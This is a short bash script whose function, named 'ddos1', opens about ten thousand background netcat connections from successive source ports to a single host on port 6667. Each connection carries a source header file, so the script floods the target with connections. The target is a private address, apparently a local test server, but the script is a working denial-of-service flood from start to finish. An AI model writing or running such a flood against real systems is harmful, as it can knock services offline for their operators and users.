#!/bin/bash

function ddos1
{
for port in {26000..35999}
do
echo "Using port nr $port"
cat ../network/connection/connection_manager.h | nc -p $port 192.168.253.131 6667 &
done
}

ddos1

